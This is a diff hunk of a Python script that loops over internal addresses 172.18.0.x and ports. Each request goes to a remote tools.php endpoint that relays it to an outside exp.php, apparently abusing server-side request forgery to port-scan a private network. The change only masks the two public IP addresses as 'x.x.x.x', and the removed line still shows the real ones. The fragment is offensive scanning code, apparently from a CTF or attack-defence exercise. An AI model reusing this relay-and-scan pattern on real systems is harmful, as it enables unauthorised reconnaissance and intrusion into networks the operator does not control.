@@ -27,7 +27,7 @@ def run():
         p = que.get()
         for ip in range(1, 255):
 	        try:
-	            url = "http://54.223.247.98:2222/tools.php?a=s&u=http://23.83.230.6/exp.php?s=tcp%26i=172.18.0.{ip}%26p={port}".format(ip=str(ip),port=p)
+	            url = "http://x.x.x.x:2222/tools.php?a=s&u=http://x.x.x.x/exp.php?s=tcp%26i=172.18.0.{ip}%26p={port}".format(ip=str(ip),port=p)
 	            #print url
 	            time.sleep(0.3)
 	            r = requests.get(url,timeout=1.8)
